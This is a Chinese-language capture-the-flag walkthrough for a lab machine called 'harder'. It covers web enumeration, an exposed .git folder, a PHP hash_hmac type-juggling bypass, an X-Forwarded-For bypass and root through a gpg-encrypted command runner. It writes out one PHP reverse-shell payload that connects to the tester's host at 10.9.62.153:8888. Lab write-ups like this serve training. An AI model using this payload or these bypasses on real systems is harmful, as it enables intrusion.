# harder

结合真实的渗透测试结果。该机器的灵感完全来自现实世界的渗透测试结果。也许你会认为它们非常具有挑战性，但没有任何兔子洞。一旦你有一个 shell，知道使用哪个底层 Linux 发行版以及某些配置的位置是非常重要的。

---

## 端口扫描

循例 nmap

![在这里插入图片描述](https://img-blog.csdnimg.cn/e48941c482cd470797f8eaa0ed1d7c1e.png)

## Web枚举

进80

![在这里插入图片描述](https://img-blog.csdnimg.cn/74435be4511f4981accc483438333762.png)

### 目录扫描

上gobuster，发现报错，原因是不管请求的页面存不存在，都是200，仅在页面内容显示404

![在这里插入图片描述](https://img-blog.csdnimg.cn/5401e36a043d48e5a887388ae6624f79.png)

上ffuf

![在这里插入图片描述](https://img-blog.csdnimg.cn/9b98ca9f69164a8e936b2fd131d91158.png)

扫到phpinfo和vendor

继续对vendor扫，一层层扫进去最后无果

![在这里插入图片描述](https://img-blog.csdnimg.cn/f354595ab90b4bacb57ccaab3b68d282.png)

在查看响应的时候发现响应头有个域名

![在这里插入图片描述](https://img-blog.csdnimg.cn/24f5498d9ff642f3975b8103941260c7.png)

将其添加进hosts

![在这里插入图片描述](https://img-blog.csdnimg.cn/26c84c0e8db94afa8058c0ac4f39f8a8.png)

进入pwd子域，是一个登录框

![在这里插入图片描述](https://img-blog.csdnimg.cn/35a672a50bf34d73b86b14c4998161c1.png)

随手一个admin:admin，进去

![在这里插入图片描述](https://img-blog.csdnimg.cn/68ce6f9c3c4946e887a774b7379658ae.png)

gobuster扫一波，有东西

![在这里插入图片描述](https://img-blog.csdnimg.cn/9d89d7c5ab7d4f11b1013d5726cda115.png)

发现有.git，直接上githacker

![在这里插入图片描述](https://img-blog.csdnimg.cn/642261cb722f4a0ca3673897b867f633.png)

### PHP代码审计

得到三个php文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/a191bc1296da48bd98604b86b4a633cb.png)

有利用价值的信息在hmac.php

```php
<?php
if (empty($_GET['h']) || empty($_GET['host'])) {
   header('HTTP/1.0 400 Bad Request');
   print("missing get parameter");
   die();
}
require("secret.php"); //set $secret var
if (isset($_GET['n'])) {
   $secret = hash_hmac('sha256', $_GET['n'], $secret);
}

$hm = hash_hmac('sha256', $_GET['host'], $secret);
if ($hm !== $_GET['h']){
  header('HTTP/1.0 403 Forbidden');
  print("extra security check failed");
  die();
}
?>
```

这段代码利用\$secret将host变量进行sha256加密然后将加密的host 即\$hm与h进行是否相等判断，虽然我们不知道\$secret的值，但是在代码中，会利用\$n变量进行sha256加密然后赋值给\$secret

目前就是要想办法利用\$n将\$secret变得可控

在php hash_hmac官方文档当中，有一条有意思的评论

![在这里插入图片描述](https://img-blog.csdnimg.cn/f96933d436454ad0a63f7e898da09381.png)

其实这里就是利用了hash_hmac的data参数只允许string的问题，如果data是非字符串，则函数直接返回空

利用这一点，我们就可以利用\$n来控制\$secret

![在这里插入图片描述](https://img-blog.csdnimg.cn/470f99c457ba4c6d8f164a122ff5ad21.png)

丢到靶机，可以看到状态码已经是200，说明通过了，但是仍然没有数据

![在这里插入图片描述](https://img-blog.csdnimg.cn/7768169a9a6d40d9965550387870e74e.png)

在index.php当中也导入hmac.php，去那边试试

![在这里插入图片描述](https://img-blog.csdnimg.cn/d4d799df2c4c400888f5cf0cc3a720ca.png)

得到了一组新凭据和一个子域

![在这里插入图片描述](https://img-blog.csdnimg.cn/dd76a35966bc4398bbb9a8bbd6ed481b.png)

将子域添加进hosts，进去看看

![在这里插入图片描述](https://img-blog.csdnimg.cn/4af715e20aba4935a0b5897284384f25.png)

又是这个登录框，使用刚刚获得的凭据登录

![在这里插入图片描述](https://img-blog.csdnimg.cn/6b06962cd18c4dd58ac6f7040cbb5dc3.png)

使用X-Forwarded-For轻松绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/0d700419fc074b8aa870b7b3d6a3dd64.png)

## Reverse Shell

能执行命令

![在这里插入图片描述](https://img-blog.csdnimg.cn/ba43ab2080da46d48e15cab9b0ebb88d.png)

这里使用php来getshell

	cmd=php+-r+'$sock%3dfsockopen("10.9.62.153",8888)%3bpopen("/bin/sh+<%263+>%263+2>%263",+"r")%3b'

**值得注意的是，shellcode必须是/bin/sh而不是bash，因为靶机根本没有/bin/bash**

![在这里插入图片描述](https://img-blog.csdnimg.cn/b4be04e2b04b437187c4c31ec4a135bd.png)

user flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/5b202666bc464cacb4d782ab69b832df.png)

## 横向移动

find www用户所有文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/e0cfda02318e47c78101dcb8ff876478.png)

给了evs的凭据，这docker里su没有suid，无法直接su过去，所有需要在外面ssh登录

![在这里插入图片描述](https://img-blog.csdnimg.cn/97e7cae1ad45461fb1a76efc8cf72332.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/cedfa907c9724c6184f00ab6d82a9e33.png)

## 权限提升

但这个脚本的注释给出的信息，说明可能还有其他脚本

![在这里插入图片描述](https://img-blog.csdnimg.cn/5fd108fae0f14cfbb1b08f17ac57f5f9.png)

这里是利用gpg加密需要执行的命令然后使用execute-crypted命令执行

![在这里插入图片描述](https://img-blog.csdnimg.cn/eaa62aea8d3f4f7fa5addc4146547f6d.png)

这里只需要跟着脚本中说的做即可，但首先需要找到公钥，之后才能使用公钥加密

![在这里插入图片描述](https://img-blog.csdnimg.cn/2a6b3278ceb24374b8421100a122ca37.png)

执行命令的文件./cmd

![在这里插入图片描述](https://img-blog.csdnimg.cn/9e2f38444289468b9fecab39b8267e35.png)

导入公钥

![在这里插入图片描述](https://img-blog.csdnimg.cn/2866c1e465c845d39e17db7130897b5e.png)

利用公钥加密

![在这里插入图片描述](https://img-blog.csdnimg.cn/585682d9e86f41a5b13d9a0a1f50ef57.png)

开启nc监听，execute-crypted执行cmd.gpg

![在这里插入图片描述](https://img-blog.csdnimg.cn/9be8390e20e24e6a91e3ab5033ca9a86.png)

getroot